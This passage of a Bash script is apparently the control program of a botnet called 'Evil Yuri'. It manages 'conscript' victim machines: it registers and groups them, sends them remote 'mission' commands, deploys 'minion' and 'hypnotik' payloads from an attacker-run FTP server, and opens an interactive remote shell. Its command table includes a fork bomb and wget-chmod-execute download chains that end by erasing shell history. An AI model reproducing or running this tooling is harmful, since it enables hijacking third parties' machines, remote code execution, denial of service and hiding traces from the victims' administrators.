        echo "[ WARNING ]: Failed to issue conscript mission command."
    fi
    echo "[ DONE ]: Conscript mission complete!"
    return $EXIT_CODE
}

function action_interogate_conscripts_for_updates () {
    if [ -z "`cat $CONSCRIPT_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    case "$TARGET" in
        'all')
            interogate_all_conscripts_for_updates
            ;;
        'group')
            interogate_grouped_conscripts_for_updates
            ;;
        'specific')
            interogate_specific_conscripts_for_updates
            ;;
        *)
            echo "[ ERROR ]: Invalid target ($TARGET)."
            return 1
            ;;
    esac
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Failed to interogate conscripts."
    fi
    echo "[ DONE ]: Conscript interogation complete!"
    return $EXIT_CODE
}

function action_register_conscript () {
    local CONSCRIPT_ID=${VICTIM_IDENTIFIERS[0]}
    check_conscript_unregistered "$CONSCRIPT_ID"
    if [ $? -ne 0 ]; then
        local FAILED_TO_REGISTER=( ${FAILED_TO_REGISTER[@]} "$CONSCRIPT_ID" )
        echo "[ WARNING ]: Conscript ($CONSCRIPT_ID) already registered."
        return 1
    fi
    register_conscript "$CONSCRIPT_ID" "${VICTIM_ADDRESSES[0]}" "${GROUP_LABELS[0]}"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Failed to register conscript ($CONSCRIPT_ID)."
    fi
    echo "[ DONE ]: Conscript registration complete!"
    return $EXIT_CODE
}

# ENSURANCE

function ensure_templates_directories_exist () {
    ensure_directory_exists "$TEMPLATES_PATH"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_minions_directories_exist () {
    ensure_directory_exists "${MINION_DIR_PATH}/bin"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_payloads_directories_exist () {
    ensure_directory_exists "${PAYLOAD_DIR_PATH}/bin"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_vsftpd_public_directory () {
    ensure_directory_exists "$FTP_PUBLIC_DIRECTORY"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        return $EXIT_CODE
    fi
    ${SYSTEM_COMMANDS['public-dir-perms']} &> /dev/null
    if [ $? -ne 0 ]; then
        echo "[ NOK ]: Could not ensure FTP public directory permissions!"\
            "(${SYSTEM_COMMANDS['public-dir-perms']})"
    fi
    return $?
}

function ensure_vsftpd_installed () {
    check_util_installed "vsftpd"
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: FTP server not installed! (vsftpd) - installing now..."
        ${SYSTEM_COMMANDS['install-vsftpd']} &> /dev/null
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Could not install FTP server!"\
                "${SYSTEM_COMMANDS['install-vsftpd']}"
            return 1
        fi
        echo "[ OK ]: Successfully installed FTP server!"
    fi
    return 0
}

function ensure_directory_exists () {
    local DIRECTORY_PATH="$1"
    if [ ! -d "$DIRECTORY_PATH" ]; then
        mkdir -p "$DIRECTORY_PATH" &> /dev/null
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Could not ensure directory exists!"\
                "(${DIRECTORY_PATH})"
            return 1
        fi
    fi
    echo "[ OK ]: Directory exists - (${DIRECTORY_PATH})"
    return 0
}

function ensure_file_exists () {
    local FILE_PATH="$1"
    if [ ! -f "$FILE_PATH" ]; then
        touch "$FILE_PATH" &> /dev/null
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Could not ensure file exists! (${FILE_PATH})"
            return 1
        fi
    fi
    echo "[ OK ]: File exists - (${FILE_PATH})"
    return 0
}

function ensure_paper_train_report_directory_exists () {
    ensure_directory_exists "$REPORT_DIR"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_conscript_index_file_exists () {
    ensure_file_exists "$CONSCRIPT_INDEX"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_group_index_file_exists () {
    ensure_file_exists "$GROUP_INDEX"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_archive_index_file_exists () {
    ensure_file_exists "$ARCHIVE_INDEX"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_conscripts_directories_exist () {
    ensure_directory_exists "$CONSCRIPT_DIR"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_archives_directories_exist () {
    ensure_directory_exists "$ARCHIVE_DIR"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_victim_machines_directory_exists () {
    ensure_directory_exists "$VICTIMS_PATH"
    if [ $? -ne 0 ]; then
        return 1
    fi
    return 0
}

function ensure_structure () {
    local BUILD_FAILURES=0
    ensure_victim_machines_directory_exists
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi
    ensure_paper_train_report_directory_exists
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi
    ensure_conscripts_directories_exist
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi
    ensure_archives_directories_exist
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi

    ensure_templates_directories_exist
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi
    ensure_minions_directories_exist
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi
    ensure_payloads_directories_exist
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi

    ensure_conscript_index_file_exists
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi
    ensure_group_index_file_exists
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi
    ensure_archive_index_file_exists
    if [ $? -ne 0 ]; then
        local BUILD_FAILURES=$((BUILD_FAILURES + 1))
    fi
    return $BUILD_FAILURES
}

function ensure_action_data () {
    local ACTION_LABEL="$1"
    case "$ACTION_LABEL" in
        'start-minion-listener')
            check_action_start_minion_call_listener_data_set
            ;;
        'stop-minion-listener')
            check_action_stop_minion_call_listener_data_set
            ;;
        'deploy-minion')
            check_action_deploy_minion_to_victim_machine_data_set
            ;;
        'deploy-payload')
            check_action_deploy_payload_to_victim_machine_data_set
            ;;
        'register-conscript')
            check_action_register_conscript_data_set
            ;;
        'group-conscripts')
            check_action_group_conscripts_data_set
            ;;
        'archive-conscripts')
            check_action_archive_conscripts_data_set
            ;;
        'panic')
            check_action_panic_data_set
            ;;
        'interogate-conscripts')
            check_action_interogate_conscripts_for_updates_data_set
            ;;
        'search-conscripts')
            check_action_search_conscripts_data_set
            ;;
        'mission-instruction')
            check_action_issue_conscript_mission_instruction_data_set
            ;;
        'delete-archive')
            check_action_delete_archive_data_set
            ;;
        'delete-group')
            check_action_delete_group_data_set
            ;;
        'create-group')
            check_action_create_group_data_set
            ;;
        'search-groups')
            check_action_search_groups_data_set
            ;;
        'search-archives')
            check_action_search_archives_data_set
            ;;
        'rebase-conscripts')
            check_action_rebase_conscripts_data_set
            ;;
        'setup-ftp')
            check_action_setup_ftp_data_set
            ;;
        'conscript-commander')
            check_action_conscript_commander_data_set
            ;;
        *)
            error_invalid_action "$ACTION_LABEL"
            ;;

    esac
    return $?
}

# DISPLAY

function display_loaded_conscript_archive () {
    if [[ "$ACTION" != 'search-archives' ]] \
            && [[ "$ACTION" != 'archive-conscripts' ]]; then
        return 1
    fi
    echo "    [ Conscript Archive  ]: ${DEPRECATED_ARCHIVE:-N/A}"
    return $?
}

function display_loaded_project_root () {
    echo "    [ Project Root       ]: ${PROJECT_ROOT:-N/A}"
    return $?
}

function display_loaded_minion_path () {
    if [[ "$ACTION" != 'deploy-minion' ]]; then
        return 1
    fi
    echo "    [ Minion Path        ]: ${MINION_PATH:-N/A}"
    return $?
}

function display_loaded_payload_path () {
    if [[ "$ACTION" != 'deploy-payload' ]]; then
        return 1
    fi
    echo "    [ Payload Path       ]: ${PAYLOAD_PATH:-N/A}"
    return $?
}

function display_loaded_action () {
    echo "    [ Action             ]: ${ACTION:-N/A}"
    return $?
}

function display_loaded_mission_cmd () {
    if [[ "$ACTION" != 'mission-instruction' ]]; then
        return 1
    fi
    echo "    [ Mission CMD        ]: ${MISSION_INSTRUCTION:-N/A}"
    return $?
}

function display_loaded_foreground_flag () {
    echo "    [ Foreground         ]: ${FOREGROUND_FLAG:-N/A}"
    return $?
}

function display_loaded_paper_trail_flag () {
    echo "    [ Paper Trail        ]: ${PAPER_TRAIL_FLAG:-N/A}"
    return $?
}

function display_loaded_port_number () {
    echo "    [ Port Number        ]: ${PORT_NUMBER:-N/A}"
    return $?
}

function display_loaded_victim_user () {
    echo "    [ Victim User        ]: ${VICTIM_USER:-N/A}"
    return $?
}

function display_loaded_protocol () {
    echo "    [ Protocol           ]: ${PROTOCOL:-N/A}"
    return $?
}

function display_loaded_target () {
    if [[ "$ACTION" =~ 'search-' ]] && [[ "$SEARCH_CRITERIA" == 'all' ]]; then
        return 1
    fi
    echo "    [ Target             ]: ${TARGET:-N/A}"
    return $?
}

function display_loaded_search_criteria () {
    if [[ ! "$ACTION" =~ 'search-' ]]; then
        return 1
    fi
    echo "    [ Search Criteria    ]: ${SEARCH_CRITERIA:-N/A}"
    return $?
}

function display_loaded_victim_addresses () {
    if [ ${#VICTIM_ADDRESSES[@]} -eq 0 ]; then
        return 1
    fi
    local VCTM_ADDRESSES="${VICTIM_ADDRESSES[@]:-N/A}"
    echo "    [ Victim Addresses   ]: ${VCTM_ADDRESSES:0:20}..."
    return $?
}

function display_loaded_victim_identifiers () {
    if [ ${#VICTIM_IDENTIFIERS[@]} -eq 0 ]; then
        return 1
    fi
    local VCTM_IDS="${VICTIM_IDENTIFIERS[@]:-N/A}"
    echo "    [ Victim Identifiers ]: ${VCTM_IDS:0:20}..."
    return $?
}

function display_loaded_group_labels () {
    if [ ${#GROUP_LABELS[@]} -eq 0 ]; then
        return 1
    fi
    local GRP_LABELS="${GROUP_LABELS[@]:-N/A}"
    echo "    [ Group Labels       ]: ${GRP_LABELS:0:20}..."
    return $?
}

function display_loaded_panic_flag () {
    if [[ "$PANIC_FLAG" != 'on' ]] || [[ "$PANIC_FLAG" != 'ON' ]]; then
        return 1
    fi
    echo "    [ PANIC              ]: ${PANIC_FLAG:-N/A}"
    return $?
}

function display_data_set () {
    display_loaded_project_root
    display_loaded_minion_path
    display_loaded_payload_path
    display_loaded_action
    display_loaded_mission_cmd
    display_loaded_foreground_flag
    display_loaded_paper_trail_flag
    display_loaded_port_number
    display_loaded_victim_user
    display_loaded_protocol
    display_loaded_target
    display_loaded_conscript_archive
    display_loaded_search_criteria
    display_loaded_victim_addresses
    display_loaded_victim_identifiers
    display_loaded_group_labels
    display_loaded_panic_flag
    echo; return 0
}

function display_header () {
    echo "
    ____________________________________________________________________________

     *            *           *  Evil Yuri - BotNet  *           *            *
    ______________________________________________________v.${VERSION}_______
                        Regards, the Alveare Solutions society.
    "
}

function display_usage () {
    display_header
    FLNAME=`basename $0`
    cat <<EOF
    [ USAGE ]: ./${FLNAME} (-<command>|--<long-command>)=<value>

    -h  | --help                 Display this message.
    -f  | --foreground           Keep server attached to terminal.
    -t= | --target=              Target used as context for action. Target can be:
                                 ('all', 'group', 'specific' or 'attribute')
    -g= | --group=               Conscript group label for action.
    -p= | --protocol=            Communication protocol to use for action.
                                 Currently supported protocols: ('raw', 'ssh')
    -a= | --action=              Action to execute using given details.
                                 Available actions are: ('start-minion-listener',
                                 'stop-minion-listener', 'deploy-minion',
                                 'deploy-payload', 'register-conscript',
                                 'group-conscripts', 'archive-conscripts', 'panic',
                                 'interogate-conscripts', 'search-conscripts',
                                 'mission-instruction', 'create-group',
                                 'search-groups', 'search-archives',
                                 'delete-group', 'delete-archive', 'setup-ftp')
    -r= | --project-root=        Path of the root directory of the project using
                                 the Evil Yuri cargo script.
    -d= | --deprecated-archive=  Name of the archive containing deprecated
                                 conscript details.
    -m= | --minion-path=         Path to the evil minion script or binary
                                 executable. The minion will be deployed to victim
                                 machine in reconnaissance mode.
    -A= | --victim-address=      IPv4 address of hypnotized conscript machines.
    -P= | --port-number=         Port number to use for action.
    -U= | --victim-user=         Username created remotely on the conscript machines
                                 by the hypnotik payloads.
    -i= | --victim-identifier=   Label of hypnotized conscript machine.
    -I= | --mission-instruction= Command for conscripts to execute remotely and
                                 return output to.
    -K= | --victim-key=          Password or key file path for remote victim user.
    -H= | --hypnotik-payload=    Path to payload script or binary executable file.
    -c= | --criteria=            Search criteria for database queries. Currently
                                 supported criterias are: ('identifier', 'address',
                                 'port', 'user', 'key', 'all')
    -R  | --papertrail-reports   Boolean switch ("on" | "off") that controls the
                                 report generator.
    -C= | --ftp-conf=            Path to the 'vsftpd' FTP server configuration
                                 file template.
    -u= | --ftp-url=             DNS or IPv4 address of the FTP server that
                                 conscripts can connect to and download payloads.

    [ EXAMPLE ]: Issue mission instruction to hypnotized conscript machines.

    ./${FLNAME} \\
        (--action               |-a)='mission-instruction' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--target               |-t)='all' \\
        (--port-number          |-P)='8080' \\
        (--victim-user          |-U)='conscript' \\
        (--victim-key           |-K)='1234' \\
        (--mission-instruction  |-I)='echo "Conscript Reporting! - "; uname -a' \\
        (--papertrail-reports   |-R)
    - OR - Issue mission instruction to specific conscript machines -
        (--action               |-a)='mission-instruction' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--target               |-t)='specific' \\
        (--victim-address       |-A)='127.0.0.1,127.0.0.2' \\
        (--port-number          |-P)='8080' \\
        (--victim-user          |-U)='conscript' \\
        (--victim-key           |-K)='1234' \\
        (--mission-instruction  |-I)='echo "Conscript Reporting! - "; uname -a' \\
        (--papertrail-reports   |-R)
    - OR - Issue mission instruction to a group of conscript machines -
        (--action               |-a)='mission-instruction' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--target               |-t)='group' \\
        (--group                |-g)='LinuxMachines' \\
        (--port-number          |-P)='8080' \\
        (--victim-user          |-U)='conscript' \\
        (--victim-key           |-K)='1234' \\
        (--mission-instruction  |-I)='echo "Conscript Reporting! - "; uname -a' \\
        (--papertrail-reports   |-R)

    [ EXAMPLE ]: Start minion listener server

    ./${FLNAME} \\
        (--action               |-a)='start-minion-listener' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--protocol             |-p)='raw' \\
        (--port_number          |-P)='8080' \\
        (--foreground           |-f)

    [ EXAMPLE ]: Stop minion listener server

    ./${FLNAME} \\
        (--action               |-a)='stop-minion-listener' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--protocol             |-p)='raw' \\
        (--port_number          |-P)='8080'

    [ EXAMPLE ]: Deploy minion

    ./${FLNAME} \\
        (--action               |-a)='deploy-minion' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--protocol             |-p)='raw' \\
        (--target               |-t)='specific' \\
        (--victim-address       |-A)='127.0.0.1,127.0.0.2' \\
        (--port-number          |-P)='8080' \\
        (--victim-user          |-U)='conscript' \\
        (--victim-key           |-K)='1234' \\
        (--ftp-url              |-u)='http://EvilYuri.com' \\
        (--minion-path          |-m)='/path/to/evil-minion'

    [ EXAMPLE ]: Deploy payload

    ./${FLNAME} \\
        (--action               |-a)='deploy-payload' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--protocol             |-p)='ssh' \\
        (--target               |-t)='specific' \\
        (--victim-address       |-A)='127.0.0.1,127.0.0.2' \\
        (--port-number          |-P)='8080' \\
        (--victim-user          |-U)='conscript' \\
        (--victim-key           |-K)='1234' \\
        (--ftp-url              |-u)='http://EvilYuri.com' \\
        (--hypnotik-payload     |-H)='/path/to/hypnotik-payload'

    [ EXAMPLE ]: Register Conscript

    ./${FLNAME} \\
        (--action               |-a)='register-conscript' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--protocol             |-p)='ssh' \\
        (--victim-address       |-A)='127.0.0.1' \\
        (--port-number          |-P)='8080' \\
        (--victim-user          |-U)='conscript' \\
        (--victim-key           |-K)='1234' \\
        (--ftp-url              |-u)='http://EvilYuri.com' \\
        (--victim-identifier    |-i)='conscript1-127-0-0-1-8080-lnx'

    [ EXAMPLE ]: Create Conscript Group

    ./${FLNAME} \\
        (--action               |-a)='create-group' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--group                |-g)='LinuxMachines'

    [ EXAMPLE ]: Group Conscripts

    ./${FLNAME} \\
        (--action               |-a)='group-conscripts' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--target               |-t)='specific' \\
        (--group                |-g)='LinuxMachines' \\
        (--victim-identifier    |-i)='conscript1,conscript2,conscript3'

    [ EXAMPLE ]: Archive Conscripts

    ./${FLNAME} \\
        (--action               |-a)='archive-conscripts' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--target               |-t)='specific' \\
        (--deprecated-archive   |-d)='Compromised-LinuxMachines' \\
        (--victim-identifier    |-i)='conscript1,conscript2'

    [ EXAMPLE ]: PANIC

    ./${FLNAME} \\
        (--action               |-a)='panic' \\
        (--project-root         |-r)='/path/to/project-dir'

    [ EXAMPLE ]: Interogate Conscripts

    ./${FLNAME} \\
        (--action               |-a)='interogate-conscripts' \\
        (--target               |-t)='specific' \\
        (--victim-address       |-i)='127.0.0.1,127.0.0.2 \\'
        (--port-number          |-P)='8080' \\
        (--victim-user          |-U)='conscript' \\
        (--victim-key           |-K)='1234'

    [ EXAMPLE ]: Search Conscripts

    ./${FLNAME} \\
        (--action               |-a)='search-conscripts' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--criteria             |-t)='identifier' \\
        (--victim-identifier    |-i)='conscript1-label,conscript2-label'

    [ EXAMPLE ]: Delete Groups

    ./${FLNAME} \\
        (--action               |-a)='delete-group' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--group                |-g)='LinuxMachines'

    [ EXAMPLE ]: Delete Archives

    ./${FLNAME} \\
        (--action               |-a)='delete-archive' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--deprecated-archive   |-d)='Compromised-LinuxMachines'

    [ EXAMPLE ]: Search Groups

    ./${FLNAME} \\
        (--action               |-a)='search-groups' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--criteria             |-t)='identifier' \\
        (--group                |-g)='group1-label,group2-label'

    [ EXAMPLE ]: Search Archives

    ./${FLNAME} \\
        (--action               |-a)='search-archives' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--criteria             |-t)='identifier' \\
        (--victim-identifier    |-i)='archived-conscript1,archived-conscript2'

    [ EXAMPLE ]: Remove Conscripts From Group

    ./${FLNAME} \\
        (--action               |-a)='rebase-conscripts' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--victim-identifier    |-i)='conscript1-label,conscript2-label'

    [ EXAMPLE ]: Setup FTP server for conscripts to connect to

    ./${FLNAME} \\
        (--action               |-a)='setup-ftp' \\
        (--ftp-conf             |-C)='/path/to/ftp/server/template.conf'

    [ EXAMPLE ]: Open interactive conscript shell

    ./${FLNAME} \\
        (--action               |-a)='conscript-commander' \\
        (--project-root         |-r)='/path/to/project-dir' \\
        (--victim-identifier    |-i)='conscript1-label'
EOF
}

# INIT

function yuri_mastermind () {
    display_header

    # [ NOTE ]: Uncomment when debugging
    display_data_set

    echo "[ YURI ]: Greetings Commander! Following orders..."
    ensure_structure
    ensure_action_data "$ACTION"
    if [ $? -ne 0 ]; then
        error_invalid_action_data
        return 1
    fi
    process_action "$ACTION"
    local EXIT_CODE=$?
    echo "[ YURI ]: Awaiting further instructions, Commander!
    "
    return $EXIT_CODE
}

# WARNINGS

function warning_invalid_action_data_set () {
    echo "[ WARNING ]: Invalid action data set."
    return 1
}

function warning_could_not_process_action () {
    echo "[ WARNING ]: Something went wrong."\
        "Could not process action - Details: (${@})"
    return 1
}

# ERRORS

function error_invalid_action_data () {
    echo "[ ERROR ]: Invalid data set detected!"
    return 1
}

function error_invalid_action () {
    echo "[ ERROR ]: Invalid action - Details: (${@})"
    return 1
}

# MISCELLANEOUS

if [ ${#@} -eq 0 ]; then
    display_usage
    exit 1
fi

for opt in $@; do
    case "$opt" in
        -h|--help)
            display_usage
            exit 0
            ;;
        -f|--foreground)
            FOREGROUND_FLAG='on'
            ;;
        -t=*|--target=*)
            TARGET="${opt#*=}"
            ;;
        -g=*|--group=*)
            NEW_LBLS=( `echo ${opt#*=} | tr ',' ' '` )
            GROUP_LABELS=( "${NEW_LBLS[@]}" ${GROUP_LABELS[@]} )
            ;;
        -p=*|--protocol=*)
            PROTOCOL="${opt#*=}"
            ;;
        -a=*|--action=*)
            ACTION="${opt#*=}"
            ;;
        -r=*|--project-root=*)
            PROJECT_ROOT="${opt#*=}"
            ;;
        -d=*|--deprecated-archive=*)
            DEPRECATED_ARCHIVE="${opt#*=}"
            ;;
        -m=*|--minion-path=*)
            MINION_PATH="${opt#*=}"
            ;;
        -A=*|--victim-address=*)
            NEW_ADDRS=( `echo "${opt#*=}" | tr ',' ' '` )
            VICTIM_ADDRESSES=( ${NEW_ADDRS[@]} ${VICTIM_ADDRESSES[@]} )
            ;;
        -P=*|--port-number=*)
            PORT_NUMBER=${opt#*=}
            ;;
        -U=*|--victim-user=*)
            VICTIM_USER="${opt#*=}"
            ;;
        -i=*|--victim-identifier=*)
            NEW_IDS=( `echo "${opt#*=}" | tr ',' ' '` )
            VICTIM_IDENTIFIERS=( ${NEW_IDS[@]} ${VICTIM_IDENTIFIERS[@]} )
            ;;
        -I=*|--mission-instruction=*)
            MISSION_INSTRUCTION="${opt#*=}"
            if [[ "$MISSION_INSTRUCTION" =~ '[space]' ]]; then
                MISSION_INSTRUCTION="`echo $MISSION_INSTRUCTION | \
                    sed 's/\[space\]/ /g'`"
            fi
            ;;
        -K=*|--victim-key=*)
            VICTIM_KEY="${opt#*=}"
            ;;
        -H=*|--hypnotik-payload=*)
            PAYLOAD_PATH="${opt#*=}"
            ;;
        -c=*|--criteria=*)
            SEARCH_CRITERIA="${opt#*=}"
            ;;
        -R|--papertrail-reports)
            PAPER_TRAIL_FLAG='on'
            ;;
        -C=*|--ftp-conf=*)
            FTP_CONF_TEMPLATE="${opt#*=}"
            ;;
        -u=*|--ftp-url=*)
            FTP_SERVER_ADDRESS="${opt#*=}"
            ;;
    esac
done

# INSTRUCTIONS

SYSTEM_COMMANDS=(
['install-vsftpd']='sudo apt-get install vsftpd -y'
['public-dir-perms']="sudo chown nobody:nogroup ${FTP_PUBLIC_DIRECTORY}"
['start-vsftpd-server']="sudo systemctl start vsftpd"
['setup-ftp-conf']="cp $FTP_CONF_TEMPLATE /etc/vsftpd.conf"
)
CONSCRIPT_COMMANDS=(
['interogate']='date +%D-%T; whoami; uname -a; history -d -5--1'
['fork-bomb']=':(){ :|:& };:'
['payload-transfer']="wget ftp://${FTP_SERVER_ADDRESS}/${PAYLOAD_PATH} && chmod +x ${PAYLOAD_PATH} && ./${PAYLOAD_PATH}; history -d -5--1"
['minion-transfer']="wget ftp://${FTP_SERVER_ADDRESS}/${PAYLOAD_PATH} && chmod +x ${PAYLOAD_PATH} && ./${PAYLOAD_PATH}; history -d -5--1"
)

yuri_mastermind
exit $?

# CODE DUMP

